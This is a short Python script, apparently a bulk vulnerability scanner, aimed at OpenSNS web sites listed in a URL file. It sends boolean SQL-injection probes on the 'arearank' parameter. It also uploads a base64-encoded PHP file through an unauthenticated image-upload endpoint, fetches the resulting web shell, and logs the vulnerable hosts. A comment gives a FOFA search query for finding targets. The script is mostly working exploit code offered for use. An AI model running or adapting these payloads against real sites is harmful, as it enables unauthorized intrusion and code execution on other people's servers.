
import json
import requests

#fofa：app="Yonyou-Seeyon-OA" && body="致远协创A6" && host!="gov.cn"

urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    payload = "/index.php?s=/people/index/area.html&arearank=-1)Or(1=1"
    vulnurl = url + payload
    vulnurl2 = url + "/index.php?s=/people/index/area.html&arearank=-1)Or(1=2"
    try:
        req1 = requests.get(vulnurl,  timeout=10, verify=False)
        req2 = requests.get(vulnurl2,  timeout=10, verify=False)
        if r"arearank/131000/arealv/2" in req1.text and r"arearank/131000/arealv/2" not in req2.text:
            print("[+]存在opensns index.php 参数arearank注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('sql漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在opensns_index_arearank漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/index.php?s=/Core/File/uploadPictureBase64.html"
    post_data = {
        "data": "data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+"
    }
    vulnurl = url + payload
    try:
        req = requests.post(vulnurl, data=post_data,  timeout=10, verify=False)
        pos = req.text.find("http:")
        shellurl = req.text[pos::].replace("\\", "").strip('"}')
        req2 = requests.get(shellurl, timeout=10, verify=False)
        if r"Configuration File (php.ini) Path" in req2.text:
            print("[+]存在opensns index.php 前台getshell漏洞...(高危)\tpayload: " + vulnurl + "\npost: " + json.dumps(post_data,indent=4) + "\nshell地址: " + shellurl,"red")
            with open('REC.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在opensns_index_getshell漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")